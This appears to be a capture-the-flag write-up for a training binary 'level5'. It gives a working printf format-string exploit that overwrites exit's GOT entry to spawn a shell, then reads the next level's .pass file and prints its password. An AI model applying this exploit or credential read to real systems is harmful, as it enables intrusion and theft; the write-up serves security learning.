# level5

In this level, we have a function that call /bin/sh. This function is never called.

The goal is to call this function (named `o`).

First we got the address of `o` using gdb:
```
> gdb level5
(gdb) disass o
...
0x080484a4 <- this is the address of o
...
```

To call o, we will replace the calls to exit by o (exit is called at the end of printf).

To get the exit address:
```
> objdump -R level5
...
08049838 R_386_JUMP_SLOT   exit
...
```

Ok so we have to replace the value in `0x08049838` (exit) to `0x080484a4` (o).

We can do this using printf (https://www.exploit-db.com/papers/23985).

We only need to replace the last 2 bytes (the first 2 bytes in exit call are already `0x0804`).

To exploit printf, we need to know what is the offset.
```bash
> for i in {0..100}; do echo "Index: $i" && echo "****%$i\$x" | ./level5 ; done | grep -B1 2a2a
Index: 4
****2a2a2a2a
```

We can write any value we want at the exit address with this line
```bash
> ./level5 < <(perl -e 'print "\x38\x98\x04\x08" . "%4\$hn"')
# exit address is 0x08040004
# we only write on the 2 last bytes
```

We dont want 4 bu 0x84a4 (33956 in decimal). So we will add a string of size 33956 - 4 = 33952
```bash
> ./level5 < <(perl -e 'print "\x38\x98\x04\x08" . "%33952x" . "%4\$hn"')
```
Ok no segfault now.

full exploit
```bash
> perl -e 'print "\x38\x98\x04\x08" . "%33952x" . "%4\$hn"' > /tmp/args
> cat /tmp/args - | ./level5
...
(level6) > cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
